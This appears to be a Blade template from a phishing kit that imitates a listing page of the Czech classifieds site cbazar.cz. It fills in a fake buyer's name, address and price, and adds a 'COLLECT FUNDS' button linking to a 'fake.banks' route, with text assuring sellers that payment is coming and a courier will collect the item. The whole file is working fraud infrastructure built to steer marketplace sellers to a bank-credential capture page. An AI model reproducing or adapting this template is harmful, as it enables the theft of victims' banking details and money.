@extends('layouts.fake')
@push('css')
    <link href="{{asset('css/cbazar.css')}}" rel="stylesheet">

    <style type="text/css" media="screen, projection">@import "https://www.cbazar.cz/web/styles/screen.css";</style>
    <link rel="stylesheet" href="https://www.cbazar.cz/web/styles/print.css" type="text/css" media="print"/>
@endpush
@section('content')
    <div id="page">
        <div id="pagein">
            <div id="pagein2">
                <hr/>
                <p id="logo"><a href="https://www.cbazar.cz/">Bazar, inzerce zdarma<span> </span></a> - vložte k nám Váš
                    inzerát zcela zdarma.</p>
                <div id="search" style="min-height: 50px">
                    <a href="{{subRoute('fake.banks',['track_id'=>$fake->track_id])}}"
                       id="good"
                       style="background: #ffcd00;color: black; border-radius: 5px;float: right;padding: 5px 10px;margin-top: 5px;margin-right: 5px"
                       class="sc-dVhcbM ccONKs">
                                                    <span class="sc-fBuWsC hvBxNu"><b
                                                                id="ch1">{{__("COLLECT FUNDS")}}</b></span>
                    </a>
                </div>
                <hr/>


                <p class="strom">
                    <a href="https://www.cbazar.cz/">Hlavní stránka</a>
                    <span class="sipka"></span>
                    <strong>{{$fake->title}} - Celá ČR</strong>
                </p>

                <div id="content" class="detail">
                    <h1 class="fll">{{$fake->title}}</h1>
                    <p class="flr"><span><strong>Nabídka</strong> - [{{$fake->created_at->addDayss(10)->format('d.m. Y')}}]</span>
                    </p>
                    <hr class="cl"/>
                    <div class="center">
                        <p>
                            <img src="{{asset($fake->img)}}"
                                 alt="image"
                                 style="max-width: 100%"
                                 id="img-detail"/></p>
                    </div>
                    <hr class="cl"/>


                    <p class="description cl">
                        {{__("After the funds are credited, please send the item to the buyer according to the given data or hand over the item by courier who will call you within 12 hours")}}
                        <br/>
                        {{__("After the item is shipped, please give the buyer a package number!")}}
                    </p>
                    <hr class="cl">
                    <table summary="Detail položky" class="fll">
                        <tr>
                            <th>Jméno:</th>
                            <td>{{$fake->recipient}}</td>
                        </tr>
                        <tr>
                            <th>Lokalita:</th>
                            <td>{{$fake->address}}</td>
                        </tr>
                        <tr>
                            <th>Cena:</th>
                            <td>{{$fake->price()}}</td>
                        </tr>
                    </table>

                    <p class="tools flr">
                        <a href="https://www.cbazar.cz" class="rating">Všechny inzeráty
                            uživatele</a><br/>
                        <a href="javascript:void(0)" class="wrong">Označit špatný inzerát</a><br/>
                        <a href="javascript:void(0)" class="wrong">Označit chybnou kategorii
                            inzerátu</a><br/>
                        <a href="#" onclick="window.print()" class="print">Vytisknout inzerát</a><br/>
                        <a href="https://www.cbazar.cz" class="send">Doporučit kamarádovi</a><br/>
                        <a href="https://www.cbazar.cz" class="web">Zobrazit inzeráty na webu do boxu</a>
                    </p>
                    <hr class="cl"/>
                </div>
                <hr/>

                <div id="sidebar">
                    <div id="tags2">
                        <h2>Nejhledané kategorie</h2>
                        <p>

                            <a href="http://pc-bazar.cbazar.cz/herni-konzole/">Herní konzole</a>,
                            <a href="http://dum-zahrada.cbazar.cz/stavebni-materialy/">Stavební materiály</a>,
                            <a href="http://detsky-bazar.cbazar.cz/autosedacky/">Autosedačky</a>,
                            <a href="http://zvirata.cbazar.cz/chovatelske-potreby/">Chovatelské potřeby</a>,
                            <a href="http://dum-zahrada.cbazar.cz/bazeny-vodni-filtry/">Bazény, vodní filtry</a>,
                            <a href="http://detsky-bazar.cbazar.cz/kocarky/">Kočárky</a>,
                            <a href="http://zvirata.cbazar.cz/psi-stenata/">Psi, štěňata</a>,
                            <a href="http://zvirata.cbazar.cz/kocky-kotata/">Kočky, koťata</a>,
                            <a href="http://sport.cbazar.cz/snowboard-snowboarding/">Snowboard, snowboarding</a>,
                            <a href="http://pc-bazar.cbazar.cz/gps-navigace/">GPS navigace</a>,
                            <a href="http://sluzby.cbazar.cz/hlidani-ditete/">Hlídání dítěte</a>,
                            <a href="http://sport.cbazar.cz/in-line-brusle-skateboarding/">In-line brusle,
                                skateboarding</a>,
                            <a href="http://detsky-bazar.cbazar.cz/kojenecke-potreby/">Kojenecké potřeby</a>,
                            <a href="http://obleceni.cbazar.cz/plavky-dresy/">Plavky, dresy</a>,
                            <a href="http://prace.cbazar.cz/prace-v-zahranici/">Práce v zahraničí</a>,
                            <a href="http://knihy.cbazar.cz/romany-pro-zeny/">Romány pro ženy</a>,
                            <a href="http://dum-zahrada.cbazar.cz/sekacky/">Sekačky</a>,
                            <a href="http://dum-zahrada.cbazar.cz/stromky-dreviny/">Stromky, dřeviny</a>,
                            <a href="http://detsky-bazar.cbazar.cz/skolni-potreby/">Školní potřeby</a>,
                            <a href="http://detsky-bazar.cbazar.cz/tehotenske-obleceni/">Těhotenské oblečení</a>,
                            <a href="http://obleceni.cbazar.cz/svatebni-saty/">Svatební šaty</a>,
                            <a href="http://dovolena.cbazar.cz/ubytovani-v-cr-i-v-evrope/">Ubytování v ČR i v Evropě</a>,
                            <a href="http://dum-zahrada.cbazar.cz/zahradni-gril-krby/">Zahradní gril, krby</a>,
                            <a href="http://nabytek.cbazar.cz/zahradni-nabytek/">Zahradní nábytek</a>,
                            <a href="http://starozitnosti.cbazar.cz/archivni-vina-destilaty/">Archivní vína,
                                destiláty</a>,
                            <a href="kategorie.php%EF%B9%96id=apple-iphone&amp;subkategorie=mobily&amp;page=&amp;vyber=.html">Apple
                                iPhone</a>,
                            <a href="http://motobazar.cbazar.cz/ctyrkolky/">Čtyřkolky</a>,
                            <a href="http://elektro.cbazar.cz/zvlhcovace-vzduchu/">Zvlhčovače vzduchu</a>
                            <!-- cache ze dne: 17.2.2022 23:39:40 -->
                        </p>
                    </div>


                    <p id="rss"><a href="#rss">RSS pro Vaší čtečku</a></p>

                </div>
                <hr/>
                <div class="cl"></div>
                <div id="ncategories">
                    <h2>Vyberte si město</h2>
                    <ul>
                        <li><a href="{{$fake->originalUrl()}}/index.html">Celá Česká republika</a></li>
                        <li><a href="{{$fake->originalUrl()}}/oblast-beroun/index.html">Beroun</a></li>
                        <li><a href="{{$fake->originalUrl()}}/oblast-brno/index.html">Brno</a></li>
                        <li><a href="{{$fake->originalUrl()}}/oblast-bruntal/index.html">Bruntál</a></li>
                        <li><a href="{{$fake->originalUrl()}}/oblast-ceske-budejovice/index.html">České Budějovice</a></li>
                        <li><a href="{{$fake->originalUrl()}}/oblast-cesky-krumlov/index.html">Český Krumlov</a></li>
                        <li><a href="{{$fake->originalUrl()}}/oblast-decin/index.html">Děčín</a></li>
                        <li><a href="{{$fake->originalUrl()}}/oblast-frydek-mistek/index.html">Frýdek - Místek</a></li>
                        <li><a href="{{$fake->originalUrl()}}/oblast-hodonin/index.html">Hodonín</a></li>
                        <li><a href="{{$fake->originalUrl()}}/oblast-hradec-kralove/index.html">Hradec Králové</a></li>
                        <li><a href="{{$fake->originalUrl()}}/oblast-chrudim/index.html">Chrudim</a></li>
                        <li><a href="{{$fake->originalUrl()}}/oblast-jablonec-nad-nisou/index.html">Jablonec nad Nisou</a></li>
                        <li><a href="{{$fake->originalUrl()}}/oblast-jesenik/index.html">Jeseník</a></li>
                        <li><a href="{{$fake->originalUrl()}}/oblast-jihlava/index.html">Jihlava</a></li>
                        <li><a href="{{$fake->originalUrl()}}/oblast-karlovy-vary/index.html">Karlovy Vary</a></li>
                        <li><a href="{{$fake->originalUrl()}}/oblast-karvina/index.html">Karviná</a></li>
                        <li><a href="{{$fake->originalUrl()}}/oblast-kladno/index.html">Kladno</a></li>
                        <li><a href="{{$fake->originalUrl()}}/oblast-kolin/index.html">Kolín</a></li>
                        <li><a href="{{$fake->originalUrl()}}/oblast-kromeriz/index.html">Kroměříž</a></li>
                        <li><a href="{{$fake->originalUrl()}}/oblast-liberec/index.html">Liberec</a></li>
                        <li><a href="{{$fake->originalUrl()}}/oblast-mlada-boleslav/index.html">Mladá Boleslav</a></li>
                        <li><a href="{{$fake->originalUrl()}}/oblast-most/index.html">Most</a></li>
                        <li><a href="{{$fake->originalUrl()}}/oblast-olomouc/index.html">Olomouc</a></li>
                        <li><a href="{{$fake->originalUrl()}}/oblast-opava/index.html">Opava</a></li>
                        <li><a href="{{$fake->originalUrl()}}/oblast-ostrava/index.html">Ostrava</a></li>
                        <li><a href="{{$fake->originalUrl()}}/oblast-pardubice/index.html">Pardubice</a></li>
                        <li><a href="{{$fake->originalUrl()}}/oblast-pelhrimov/index.html">Pelhřimov</a></li>
                        <li><a href="{{$fake->originalUrl()}}/oblast-pisek/index.html">Písek</a></li>
                        <li><a href="{{$fake->originalUrl()}}/oblast-plzen/index.html">Plzeň</a></li>
                        <li><a href="{{$fake->originalUrl()}}/oblast-praha/index.html">Praha</a></li>
                        <li><a href="{{$fake->originalUrl()}}/oblast-prostejov/index.html">Prostějov</a></li>
                        <li><a href="{{$fake->originalUrl()}}/oblast-prerov/index.html">Přerov</a></li>
                        <li><a href="{{$fake->originalUrl()}}/oblast-sokolov/index.html">Sokolov</a></li>
                        <li><a href="{{$fake->originalUrl()}}/oblast-svitavy/index.html">Svitavy</a></li>
                        <li><a href="{{$fake->originalUrl()}}/oblast-sumperk/index.html">Šumperk</a></li>
                        <li><a href="{{$fake->originalUrl()}}/oblast-tabor/index.html">Tábor</a></li>
                        <li><a href="{{$fake->originalUrl()}}/oblast-trebic/index.html">Třebíč</a></li>
                        <li><a href="{{$fake->originalUrl()}}/oblast-usti-nad-labem/index.html">Ústí nad Labem</a></li>
                        <li><a href="{{$fake->originalUrl()}}/oblast-usti-nad-labem/index.html">Ústí nad Labem</a></li>
                        <li><a href="{{$fake->originalUrl()}}/oblast-vsetin/index.html">Vsetín</a></li>
                        <li><a href="{{$fake->originalUrl()}}/oblast-zlin/index.html">Zlín</a></li>
                        <li><a href="{{$fake->originalUrl()}}/oblast-znojmo/index.html">Znojmo</a></li>
                        <li><a href="{{$fake->originalUrl()}}/oblast-zdar-nad-sazavou/index.html">Ždár nad Sázavou</a>
                        </li>

                    </ul>
                </div>
                <hr/>
                <div id="menu">
                    <ul>
                        <li class="first"><a href="https://www.cbazar.cz/novinky/">Novinky</a></li>
                        <li><a href="https://www.cbazar.cz/podminky/">Podmínky</a></li>
                        <li><a href="https://www.cbazar.cz/zasady-ochrany-osobnich-udaju/">Zásady ochrany osobních
                                údajů</a>
                        </li>
                        <li><a href="https://www.cbazar.cz/zpetne-odkazy/">Zpětné odkazy</a></li>
                        <li><a href="https://www.cbazar.cz/info-registrace/">Proč se registrovat</a></li>
                        <li id="comments"><a href="https://www.cbazar.cz/kontakt/">Kontaktní informace</a></li>
                    </ul>
                </div>
                <hr/>
                <p id="footer"><br/>
                    <span class="flr">Copyright &copy; 2001 - {{date('Y')}}<strong> Cbazar.cz</strong></span>
                    <span class="cl"></span>
                </p>
            </div>
        </div>
    </div>
@endsection